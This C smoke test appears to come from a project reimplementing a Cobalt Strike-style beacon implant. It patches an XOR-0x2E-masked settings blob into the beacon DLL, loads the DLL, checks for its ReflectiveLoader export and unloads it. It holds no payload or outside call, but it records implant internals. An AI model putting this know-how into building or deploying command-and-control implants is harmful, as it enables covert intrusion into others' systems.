/* stageless 形状冒烟（P3.13 的 CI 可执行部分）
 *
 * 复现 artifact64big.exe 装载序列的前半段：
 *   1. DLL 以文件形式存在，配置 blob 被 patch 进 .data（容器把 payload 写进自身 .data）；
 *   2. LoadLibrary → CRT 初始化 → DllMain(DLL_PROCESS_ATTACH) → settings_init 解析 blob；
 *   3. 验证 ReflectiveLoader 导出存在（容器经它完成反射加载的前置定位）；
 *   4. FreeLibrary 干净卸载，无崩溃。
 * 不含 reason-4（beacon 主循环）——那需要真实 TeamServer，超出本测试边界。
 *
 * 退出码 0 = 冒烟通过。
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>

/* 复制 DLL 到冒烟文件名，避免污染构建产物本体 */
static BOOL copy_dll(const char * src, char * dst, DWORD dstlen) {
	DWORD n = GetModuleFileNameA(NULL, dst, dstlen); (void)n;
	char * slash = strrchr(dst, '\\');
	if (slash == NULL) return FALSE;
	*slash = '\0';
	if (strlen(dst) + strlen("\\beacon_smoke.dll") + 1 >= dstlen) return FALSE;
	strcat(dst, "\\beacon_smoke.dll");
	return CopyFileA(src, dst, FALSE) ? TRUE : FALSE;
}

int main(int argc, char ** argv) {
	if (argc < 2) {
		printf("usage: load_smoke.exe <path-to-beacon.x64.dll>\n");
		return 2;
	}

	char smokePath[MAX_PATH];
	if (!copy_dll(argv[1], smokePath, sizeof(smokePath))) {
		printf("FAIL: cannot copy dll to %s\n", smokePath);
		return 2;
	}

	/* ---- step 1: patch 配置 blob ----
	 * settings.cpp 的补丁区初始值为 "AAAABBBBCCCC..."（未掩码态，文件内即明文）。
	 * 运行时 settings_init 会 XOR 0x2E 解掩码后解析。我们写入"已掩码"的合法
	 * blob：entry{index=31(SETTING_CRYPTO_SCHEME), type=SHORT, len=2, value=0}
	 * 后接 index=0 终止符；占位文本的其余字节解掩码后是垃圾，但解析在
	 * 终止符处停止，不会触达。 */
	static const char PLACEHOLDER[] = "AAAABBBBCCCC";
	static const unsigned char PATCH[] = { 0x2E,0x31,0x2E,0x2F,0x2E,0x2C,0x2E,0x2E }; /* 001F 0001 0002 0000 ^ 0x2E */

	HANDLE hf = CreateFileA(smokePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hf == INVALID_HANDLE_VALUE) {
		printf("FAIL: cannot open %s (err %lu)\n", smokePath, GetLastError());
		return 2;
	}

	/* 全文件扫描：占位串位于 .data 节，远在文件头 4KB 之外 */
	DWORD size = GetFileSize(hf, NULL);
	char * buf = (char *)malloc(size);
	DWORD read = 0, wrote = 0;
	BOOL ok = (buf != NULL) && ReadFile(hf, buf, size, &read, NULL) && (read == size);
	long off = -1;
	if (ok) {
		for (DWORD i = 0; i + sizeof(PLACEHOLDER) - 1 <= read; i++) {
			if (memcmp(buf + i, PLACEHOLDER, sizeof(PLACEHOLDER) - 1) == 0) { off = (long)i; break; }
		}
	}
	if (buf != NULL) free(buf);
	if (off < 0) {
		printf("FAIL: settings placeholder not found in dll (scanned %lu bytes)\n", read);
		CloseHandle(hf);
		return 2;
	}
	if (!SetFilePointer(hf, off, NULL, FILE_BEGIN) || !WriteFile(hf, PATCH, sizeof(PATCH), &wrote, NULL)) {
		printf("FAIL: blob patch failed (err %lu)\n", GetLastError());
		CloseHandle(hf);
		return 2;
	}
	CloseHandle(hf);
	printf("[smoke] blob patched at file offset %ld\n", off);

	/* ---- step 2-4: 装载 → 验证导出 → 卸载 ---- */
	HMODULE h = LoadLibraryA(smokePath);
	if (h == NULL) {
		printf("FAIL: LoadLibrary error %lu\n", GetLastError());
		return 1;
	}
	printf("[smoke] loaded at %p\n", (void *)h);

	void * loader = (void *)GetProcAddress(h, "ReflectiveLoader");
	if (loader == NULL) {
		printf("FAIL: ReflectiveLoader export missing (err %lu)\n", GetLastError());
		FreeLibrary(h);
		return 1;
	}
	printf("[smoke] ReflectiveLoader export ok at %p\n", loader);

	FreeLibrary(h);
	printf("[smoke] freed cleanly\n");
	DeleteFileA(smokePath);
	printf("== load smoke passed ==\n");
	return 0;
}
